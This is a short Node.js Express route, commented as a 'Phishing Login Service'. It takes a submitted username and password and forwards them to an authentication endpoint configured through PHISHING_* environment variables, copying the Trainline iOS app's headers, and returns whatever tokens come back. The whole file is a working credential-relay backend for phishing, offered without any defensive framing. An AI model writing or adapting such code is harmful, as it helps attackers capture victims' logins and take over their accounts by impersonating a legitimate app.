

const express = require('express');
const router = express.Router();
const request = require("request");

require('dotenv').config();

//Phishing Login Service

router.post('/', (req, res) => {

  var options = {
    method: 'POST',
    url: process.env.PHISHING_ENDPOINT,
    headers:
    {
      'accept-language': 'en-gb',
      'auth0-client': 'eyJzd2lmdC12ZXJzaW9uIjoiMy4wIiwidmVyc2lvbiI6IjEuMTMuMCIsIm5hbWUiOiJBdXRoMC5zd2lmdCJ9',
      'user-agent': 'Trainline/19166 CFNetwork/975.0.3 Darwin/18.2.0',
      'x-newrelic-id': 'UAcAUVNUGwcIUVVSDwA=',
      Accept: '*/*',
      'Content-Type': 'application/json'
    },
    body:
    {
      grant_type: process.env.PHISHING_GRANT_TYPE,
      username: req.body.username,
      password: req.body.password,
      audience: process.env.PHISHING_AUDIENCE,
      scope: process.env.PHISHING_SCOPE,
      client_id: process.env.PHISHING_CLIENTID,
      realm: process.env.PHISHING_REALM
    },
    json: true
  };

  request(options, function (error, response, body) {
    if (error) throw new Error(error);

    res.send(body)

  });

})

module.exports = router;